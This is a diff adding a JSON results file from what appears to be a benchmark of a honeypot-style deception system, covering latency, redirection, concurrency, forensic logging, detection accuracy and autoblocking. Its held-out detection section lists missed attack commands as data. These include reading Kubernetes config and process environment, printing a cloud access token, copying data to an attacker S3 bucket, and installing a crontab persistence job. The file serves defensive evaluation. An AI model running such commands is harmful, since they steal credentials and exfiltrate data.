@@ -1,0 +1,314 @@
+{
+  "environment": {
+    "python": "3.13.2",
+    "platform": "win32",
+    "cpus": 4,
+    "build": "review2"
+  },
+  "A_proxy_overhead": {
+    "direct_victim": {
+      "n": 3000,
+      "mean": 0.55,
+      "p50": 0.351,
+      "p95": 1.709,
+      "p99": 2.637,
+      "max": 13.056
+    },
+    "via_controller": {
+      "n": 3000,
+      "mean": 0.581,
+      "p50": 0.446,
+      "p95": 1.121,
+      "p99": 1.675,
+      "max": 2.558
+    },
+    "overhead_mean_ms": 0.031,
+    "overhead_p95_ms": -0.588
+  },
+  "B_redirection": {
+    "sequential_sessions": 200,
+    "failed_sessions": 0,
+    "first_failure_at_session": null,
+    "trigger_rtt_ms": {
+      "n": 200,
+      "mean": 7.782,
+      "p50": 5.36,
+      "p95": 11.397,
+      "p99": 59.33,
+      "max": 99.812
+    },
+    "redirect_overhead_ms": {
+      "n": 200,
+      "mean": 6.804,
+      "p50": 4.639,
+      "p95": 10.365,
+      "p99": 53.211,
+      "max": 97.385
+    },
+    "post_redirect_rtt_ms": {
+      "n": 400,
+      "mean": 0.874,
+      "p50": 0.619,
+      "p95": 1.351,
+      "p99": 7.93,
+      "max": 12.772
+    }
+  },
+  "C_concurrency": [
+    {
+      "concurrent_sessions": 10,
+      "completed": 10,
+      "failed": 0,
+      "success_rate_pct": 100.0,
+      "error_types": [],
+      "wall_clock_s": 0.09,
+      "sessions_per_s": 114.2,
+      "benign_rtt_ms": {
+        "n": 30,
+        "mean": 0.826,
+        "p50": 0.577,
+        "p95": 1.951,
+        "p99": 2.108,
+        "max": 2.108
+      },
+      "trigger_rtt_ms": {
+        "n": 10,
+        "mean": 10.515,
+        "p50": 10.015,
+        "p95": 16.113,
+        "p99": 16.113,
+        "max": 16.113
+      },
+      "post_redirect_rtt_ms": {
+        "n": 20,
+        "mean": 1.03,
+        "p50": 1.039,
+        "p95": 1.721,
+        "p99": 2.474,
+        "max": 2.474
+      },
+      "forensic_sessions_logged": 0,
+      "forensic_commands_logged": 0,
+      "forensic_completeness_pct": 0.0,
+      "forensic_report_corrupt": true,
+      "controller_after_load": {}
+    },
+    {
+      "concurrent_sessions": 50,
+      "completed": 50,
+      "failed": 0,
+      "success_rate_pct": 100.0,
+      "error_types": [],
+      "wall_clock_s": 0.55,
+      "sessions_per_s": 91.5,
+      "benign_rtt_ms": {
+        "n": 150,
+        "mean": 2.948,
+        "p50": 1.206,
+        "p95": 12.251,
+        "p99": 19.684,
+        "max": 25.286
+      },
+      "trigger_rtt_ms": {
+        "n": 50,
+        "mean": 76.226,
+        "p50": 21.07,
+        "p95": 214.383,
+        "p99": 215.514,
+        "max": 215.514
+      },
+      "post_redirect_rtt_ms": {
+        "n": 100,
+        "mean": 5.58,
+        "p50": 1.918,
+        "p95": 12.498,
+        "p99": 39.381,
+        "max": 98.359
+      },
+      "forensic_sessions_logged": 261,
+      "forensic_commands_logged": 789,
+      "forensic_completeness_pct": 100.0,
+      "forensic_report_corrupt": false,
+      "controller_after_load": {}
+    },
+    {
+      "concurrent_sessions": 100,
+      "completed": 100,
+      "failed": 0,
+      "success_rate_pct": 100.0,
+      "error_types": [],
+      "wall_clock_s": 0.8,
+      "sessions_per_s": 124.8,
+      "benign_rtt_ms": {
+        "n": 300,
+        "mean": 1.812,
+        "p50": 1.51,
+        "p95": 3.907,
+        "p99": 5.831,
+        "max": 11.139
+      },
+      "trigger_rtt_ms": {
+        "n": 100,
+        "mean": 109.355,
+        "p50": 90.842,
+        "p95": 294.848,
+        "p99": 316.302,
+        "max": 322.442
+      },
+      "post_redirect_rtt_ms": {
+        "n": 200,
+        "mean": 17.161,
+        "p50": 13.206,
+        "p95": 39.257,
+        "p99": 173.411,
+        "max": 195.173
+      },
+      "forensic_sessions_logged": 361,
+      "forensic_commands_logged": 1089,
+      "forensic_completeness_pct": 100.0,
+      "forensic_report_corrupt": false,
+      "controller_after_load": {}
+    },
+    {
+      "concurrent_sessions": 200,
+      "completed": 200,
+      "failed": 0,
+      "success_rate_pct": 100.0,
+      "error_types": [],
+      "wall_clock_s": 1.8,
+      "sessions_per_s": 110.8,
+      "benign_rtt_ms": {
+        "n": 600,
+        "mean": 2.325,
+        "p50": 1.546,
+        "p95": 6.931,
+        "p99": 17.817,
+        "max": 27.257
+      },
+      "trigger_rtt_ms": {
+        "n": 200,
+        "mean": 258.651,
+        "p50": 320.732,
+        "p95": 588.911,
+        "p99": 596.665,
+        "max": 599.413
+      },
+      "post_redirect_rtt_ms": {
+        "n": 400,
+        "mean": 57.763,
+        "p50": 41.556,
+        "p95": 310.28,
+        "p99": 334.826,
+        "max": 336.73
+      },
+      "forensic_sessions_logged": 561,
+      "forensic_commands_logged": 1689,
+      "forensic_completeness_pct": 100.0,
+      "forensic_report_corrupt": false,
+      "controller_after_load": {}
+    },
+    {
+      "concurrent_sessions": 400,
+      "completed": 400,
+      "failed": 0,
+      "success_rate_pct": 100.0,
+      "error_types": [],
+      "wall_clock_s": 4.4,
+      "sessions_per_s": 91.0,
+      "benign_rtt_ms": {
+        "n": 1200,
+        "mean": 2.733,
+        "p50": 1.4,
+        "p95": 11.409,
+        "p99": 19.744,
+        "max": 32.098
+      },
+      "trigger_rtt_ms": {
+        "n": 400,
+        "mean": 1192.13,
+        "p50": 1340.185,
+        "p95": 1850.448,
+        "p99": 1904.423,
+        "max": 1916.413
+      },
+      "post_redirect_rtt_ms": {
+        "n": 800,
+        "mean": 213.134,
+        "p50": 145.361,
+        "p95": 705.651,
+        "p99": 724.117,
+        "max": 729.671
+      },
+      "forensic_sessions_logged": 961,
+      "forensic_commands_logged": 2889,
+      "forensic_completeness_pct": 100.0,
+      "forensic_report_corrupt": false,
+      "controller_after_load": {}
+    }
+  ],
+  "D_detection": {
+    "malicious": 50,
+    "benign": 50,
+    "TP": 50,
+    "FP": 0,
+    "FN": 0,
+    "TN": 50,
+    "precision": 1.0,
+    "recall": 1.0,
+    "f1": 1.0,
+    "accuracy": 1.0,
+    "false_negatives": [],
+    "false_positives": [],
+    "long_benign_session_flagged_by_count_rule": false,
+    "inspect_time_us": 22.91
+  },
+  "D2_heldout_detection": {
+    "malicious": 25,
+    "benign": 25,
+    "TP": 18,
+    "FP": 0,
+    "FN": 7,
+    "TN": 25,
+    "precision": 1.0,
+    "recall": 0.72,
+    "false_negatives": [
+      "cat ~/.kube/config",
+      "aws s3 cp /tmp/data.tgz s3://attacker-bucket/",
+      "echo '* * * * * /tmp/x.sh' | crontab -",
+      "history | grep ssh",
+      "gcloud auth print-access-token",
+      "cat /proc/self/environ",
+      "sqlmap -u http://app/login"
+    ],
+    "false_positives": []
+  },
+  "E_engagement": {
+    "profiles": {
+      "A_scanner": {
+        "score": 14.0,
+        "level": "Low",
+        "commands": 1,
+        "dwell_seconds": 0.0,
+        "sensitive_touches": 1
+      },
+      "B_explorer": {
+        "score": 32.0,
+        "level": "Medium",
+        "commands": 3,
+        "dwell_seconds": 0.0,
+        "sensitive_touches": 2
+      },
+      "C_data_thief": {
+        "score": 32.0,
+        "level": "Medium",
+        "commands": 3,
+        "dwell_seconds": 0.0,
+        "sensitive_touches": 2
+      }
+    }
+  },
+  "F_autoblock": {
+    "blocked_source_refused": false,
+    "other_source_still_served": true
+  }
+}
